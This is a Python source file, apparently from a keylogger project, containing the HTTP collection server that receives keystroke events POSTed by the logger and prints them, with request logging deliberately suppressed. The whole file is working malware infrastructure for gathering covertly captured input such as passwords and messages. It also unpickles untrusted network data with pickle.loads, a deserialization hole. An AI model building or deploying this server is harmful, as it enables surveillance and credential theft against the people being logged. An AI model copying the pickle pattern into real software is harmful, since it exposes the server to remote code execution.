from http.server import BaseHTTPRequestHandler, HTTPServer, HTTPStatus
from logging import INFO, StreamHandler, getLogger
from pickle import loads

from .events import Event


class KeyloggerHTTPRequestHandler(BaseHTTPRequestHandler):
    def send_response(self, code, message=None):
        """Overrides super class method to get rid of the call to `log_request`.
        """
        self.send_response_only(code, message)
        self.send_header('Server', self.version_string())
        self.send_header('Date', self.date_time_string())

    def do_POST(self):
        data = self.rfile.read(int(self.headers.get('Content-Length')))
        if self.headers.get('data-format') == 'raw':
            print(Event.from_raw(data))
        else:
            print(loads(data))
        self.send_response(HTTPStatus.OK)
        self.end_headers()


def server_loop(address: str, port: int):
    server = HTTPServer((address, port), KeyloggerHTTPRequestHandler)
    print(f'Server listening on {address}:{port}')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('Server shuting down!')
        server.shutdown()
